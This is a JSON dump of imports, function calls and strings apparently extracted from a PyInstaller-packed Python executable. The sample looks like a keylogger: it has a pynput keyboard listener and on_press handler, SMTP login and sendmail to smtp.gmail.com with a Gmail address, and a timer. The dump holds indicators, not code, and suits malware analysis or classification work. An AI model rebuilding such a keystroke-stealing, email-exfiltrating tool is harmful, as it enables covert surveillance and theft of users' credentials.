{
    "imports": [
        "pynput.keyboard",
        "ssl",
        "_frozen_importlib",
        "smtplib",
        "sys",
        "struct",
        "popen_spawn_win32",
        "multiprocessing",
        "ArchiveReadError",
        "listdir",
        "os",
        "time",
        "environ",
        "re",
        "requests",
        "popen_fork",
        "threading",
        "popen_spawn_posix",
        "_clearcache",
        "ZlibArchiveReader",
        "pyimod00_crypto_key",
        "marshal",
        "zlib",
        "*",
        "_thread",
        "__doc__",
        "_args_from_interpreter_flags",
        "pyimod03_importers",
        "spawn",
        "pyimod01_os_path"
    ],
    "function_calls": [
        "reversed",
        "remove",
        "__create_cipher",
        "sleep",
        "split",
        "vaxtashiri",
        "list",
        "AES",
        "type",
        "local",
        "dict",
        "is_package",
        "write",
        "unpack",
        "rfind",
        "loads",
        "ArchiveReadError",
        "replace",
        "get_ident",
        "ImportError",
        "join",
        "quit",
        "putenv",
        "starttls",
        "Timer",
        "SMTP",
        "ModuleSpec",
        "startswith",
        "hasattr",
        "os_path_join",
        "load_module",
        "getattr",
        "CTR_xcrypt_buffer",
        "abspath",
        "seek",
        "extend",
        "sendmail",
        "get",
        "get_code",
        "exit",
        "set",
        "install",
        "gonder_mesaj",
        "print",
        "os_path_basename",
        "range",
        "len",
        "trace",
        "encode",
        "NullWriter",
        "FrozenImporter",
        "FrozenPackageImporter",
        "exec",
        "start",
        "read",
        "append",
        "os_listdir",
        "login",
        "Listener",
        "FilePos",
        "_args_from_interpreter_flags",
        "get_default_verify_paths",
        "os_path_dirname",
        "keys",
        "get_filename",
        "rsplit"
    ],
    "strings": [
        "",
        "iter_unpack",
        "\n        PEP-451 finder.find_spec() method for the ``sys.meta_path`` hook.\n\n        fullname     fully qualified name of the module\n        path         None for a top-level module, or package.__path__ for\n                     submodules or subpackages.\n        target       unused by this Finder\n\n        Finders are still responsible for identifying, and typically creating,\n        the loader that should be used to load a module. That loader will now\n        be stored in the module spec returned by find_spec() rather than\n        returned directly. As is currently the case without the PEP-452, if a\n        loader would be costly to create, that loader can be designed to defer\n        the cost until later.\n\n        Finders must return ModuleSpec objects when find_spec() is called.\n        This new method replaces find_module() and find_loader() (in the\n        PathEntryFinder case). If a loader does not have find_spec(),\n        find_module() and find_loader() are used instead, for\n        backward-compatibility.\n        ",
        "!i",
        "\n        PEP-451 loader.exec_module() method for the ``sys.meta_path`` hook.\n\n        Loaders will have a new method, exec_module(). Its only job is to\n        \"exec\" the module and consequently populate the module's namespace. It\n        is not responsible for creating or preparing the module object, nor\n        for any cleanup afterward. It has no return value. exec_module() will\n        be used during both loading and reloading.\n\n        exec_module() should properly handle the case where it is called more\n        than once. For some kinds of modules this may mean raising ImportError\n        every time after the first time the method is called. This is\n        particularly relevant for reloading, where some kinds of modules do\n        not support in-place reloading.\n        ",
        "Zdr7",
        "\nSet up 'os' and 'os.path' module replacement functions for use during import\nbootstrap.\n",
        "utf-8",
        "from multiprocessing.resource_tracker import main",
        "\n        PEP-451 loader.create_module() method for the ``sys.meta_path`` hook.\n\n        Loaders may also implement create_module() that will return a new\n        module to exec. It may return None to indicate that the default module\n        creation code should be used. One use case, though atypical, for\n        create_module() is to provide a module that is a subclass of the\n        builtin module type. Most loaders will not need to implement\n        create_module(),\n\n        create_module() should properly handle the case where it is called\n        more than once for the same spec/module. This may include returning\n        None or raising ImportError.\n        ",
        "calcsize",
        "https://en.wikipedia.org/wiki/Reader",
        "NNNJK",
        "\n    This class keeps track of the file object representing and current position\n    in a file.\n    ",
        "WindowsRegistryFinder",
        "VIRTUAL_ENV",
        "Xauima",
        "\n        Get the code object associated with the module.\n\n        ImportError should be raised if module not found.\n        ",
        "\n        This method should return the value that __file__ would be set to\n        if the named module was loaded. If the module is not found, then\n        ImportError should be raised.\n        ",
        "Struct",
        "\n        Open file and seek to pos record from last close.\n        ",
        "\n    A base class for a repository of python code objects.\n    The extract method is used by imputil.ArchiveImporter\n    to get code objects by name (fully qualified name), so\n    an enduser \"import a.b\" would become\n      extract('a.__init__')\n      extract('a.b')\n    ",
        "SSL_CERT_FILE",
        "cacert.pem",
        "Welcome to Generius",
        "\\",
        "/\\",
        "from multiprocessing.forkserver import main",
        "\n        Return a list of the contents\n        Default implementation assumes self.toc is a dict like object.\n        Not required by ArchiveImporter.\n        ",
        "\n        PEP-302 loader.load_module() method for the ``sys.meta_path`` hook.\n\n        Return the loaded module (instance of imp_new_module()) or raises\n        an exception, preferably ImportError if an existing exception\n        is not being propagated.\n\n        When called from FrozenPackageImporter, `entry_name` is the name of the\n        module as it is stored in the archive. This module will be loaded and installed\n        into sys.modules using `fullname` as its name\n        ",
        "unpack",
        ".pyc",
        "pack_into",
        "Doma sa",
        "__name__",
        "No module named ",
        "nt",
        "origin",
        "%s has version mismatch to dll",
        "%s is not a valid %s archive file",
        "posix",
        "\n        Return an instance of FilePos for the current thread. This is a crude\n        # re-implementation of threading.local, which isn't a built-in module\n        # and therefore isn't available.\n        ",
        "win",
        "certifi",
        "\n    This class is used only to decrypt Python modules.\n    ",
        "is_package",
        "loader_state",
        "-c",
        "__init__.pyc",
        "\n    ZlibArchive - an archive with compressed entries. Archive is read\n    from the executable created by PyInstaller.\n\n    This archive is used for bundling python modules inside the executable.\n\n    NOTE: The whole ZlibArchive (PYZ) is compressed so it is not necessary\n          to compress single modules with zlib.\n    ",
        "\n        Method should return the source code for the module as a string.\n        But frozen modules does not contain source code.\n\n        Return None.\n        ",
        "unpack_from",
        ":",
        "import %s as %s # PyInstaller PYZ (__path__ override: %s)",
        "\n        Overridable.\n        Default: After magic comes an int (4 byte native) giving the\n        position of the TOC within self.lib.\n        Default: The TOC is a marshal-able string.\n        ",
        "No os specific module found",
        "\n    Wrapper class for FrozenImporter that imports one specific fullname from\n    a module named by an alternate fullname. The alternate fullname is derived from the\n    __path__ of the package module containing that module.\n\n    This is called by FrozenImporter.find_module whenever a module is found as a result\n    of searching module.__path__\n    ",
        "pack",
        "\n    File class support auto open when access member from file object\n    This class is use to avoid file locking on windows\n    ",
        "\n        Get the object corresponding to name, or None.\n        For use with imputil ArchiveImporter, object is a python code object.\n        'name' is the name as specified in an 'import name'.\n        'import a.b' will become:\n        extract('a') (return None because 'a' is not a code object)\n        extract('a.__init__') (return a code object)\n        extract('a.b') (return a code object)\n        Default implementation:\n          self.toc is a dict\n          self.toc[name] is pos\n          self.lib has the code object marshal-ed at pos\n        ",
        "Hello World",
        "UTF-8",
        "usertimebox@gmail.com",
        "\n        Make this class act like a file, by invoking most methods on its\n        underlying file object.\n        ",
        "\n        This returns the data as a string, or raise IOError if the \"file\"\n        wasn't found. The data is always returned as if \"binary\" mode was used.\n\n        This method is useful getting resources with 'pkg_resources' that are\n        bundled with Python modules in the PYZ archive.\n\n        The 'path' argument is a path that can be constructed by munging\n        module.__file__ (or pkg.__path__ items)\n        ",
        "frozen",
        "_MEIPASS2",
        "\n        PEP-302 finder.find_module() method for the ``sys.meta_path`` hook.\n\n        fullname     fully qualified name of the module\n        path         None for a top-level module, or package.__path__\n                     for submodules or subpackages.\n\n        Return a loader object if the module was found, or None if it wasn't.\n        If find_module() raises an exception, it will be propagated to the\n        caller, aborting the import.\n        ",
        "\n        Overridable.\n        Check to see if the file object self.lib actually has a file\n        we understand.\n        ",
        "on_press",
        "# %s not found in PYZ",
        "BDABbjkBKHhkNKnkNLjlK",
        "\n    Install FrozenImporter class and other classes into the import machinery.\n\n    This class method (static method) installs the FrozenImporter class into\n    the import machinery of the running process. The importer is added\n    to sys.meta_path. It could be added to sys.path_hooks but sys.meta_path\n    is processed by Python before looking at sys.path!\n\n    The order of processing import hooks in sys.meta_path:\n\n    1. built-in modules\n    2. modules from the bundled ZIP archive\n    3. C extension modules\n    4. Modules from sys.path\n    ",
        "\n        Close file and record pos.\n        ",
        "import %s # PyInstaller PYZ",
        "\n    Load bytecode of Python modules from the executable created by PyInstaller.\n\n    Python bytecode is zipped and appended to the executable.\n\n    NOTE: PYZ format cannot be replaced by zipimport module.\n\n    The problem is that we have no control over zipimport; for instance,\n    it doesn't work if the zip file is embedded into a PKG appended\n    to an executable, like we create in one-file.\n\n    This is PEP-302 finder and loader class for the ``sys.meta_path`` hook.\n    A PEP-302 finder requires method find_module() to return loader\n    class with method load_module(). Both these methods are implemented\n    in one class.\n\n    This is also a PEP-451 finder and loader class for the ModuleSpec type\n    import system. A PEP-451 finder requires method find_spec(), a PEP-451\n    loader requires methods exec_module(), load_module(9 and (optionally)\n    create_module(). All these methods are implemented in this one class.\n\n    To use this class just call\n\n        FrozenImporter.install()\n    ",
        "\n        Load, unzip and initialize the Zip archive bundled with the executable.\n        ",
        "PYTHONCASEOK",
        "\n        Initialize an Archive. If path is omitted, it will be an empty Archive.\n        ",
        ".",
        "from multiprocessing.semaphore_tracker import main",
        "mazandaran",
        "error",
        "PathFinder",
        "\n",
        "denen",
        "smtp.gmail.com",
        "\nPEP-302 and PEP-451 importers for frozen applications.\n",
        "/"
    ]
}